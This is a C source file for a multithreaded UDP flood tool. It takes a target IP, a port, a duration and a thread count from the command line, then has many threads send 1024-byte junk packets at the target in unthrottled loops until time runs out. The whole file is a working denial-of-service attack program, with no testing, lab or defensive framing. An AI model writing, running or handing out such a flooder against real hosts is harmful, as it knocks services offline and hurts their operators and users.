#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>

struct target_data {
    char *ip;
    int port;
    int duration;
};

void *send_udp_traffic(void *arg) {
    struct target_data *data = (struct target_data *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in addr;
    
    addr.sin_family = AF_INET;
    addr.sin_port = htons(data->port);
    addr.sin_addr.s_addr = inet_addr(data->ip);

    char message[1024]; // Payload size
    memset(message, 'X', sizeof(message));

    time_t end = time(NULL) + data->duration;
    while (time(NULL) < end) {
        sendto(sock, message, sizeof(message), 0, (struct sockaddr *)&addr, sizeof(addr));
    }
    
    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("Usage: %s <IP> <PORT> <TIME> [THREADS]\n", argv[0]);
        return 1;
    }

    struct target_data data;
    data.ip = argv[1];
    data.port = atoi(argv[2]);
    data.duration = atoi(argv[3]);
    int thread_count = (argc == 5) ? atoi(argv[4]) : 10; // Default to 10 threads

    pthread_t threads[thread_count];
    for (int i = 0; i < thread_count; i++) {
        pthread_create(&threads[i], NULL, send_udp_traffic, &data);
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}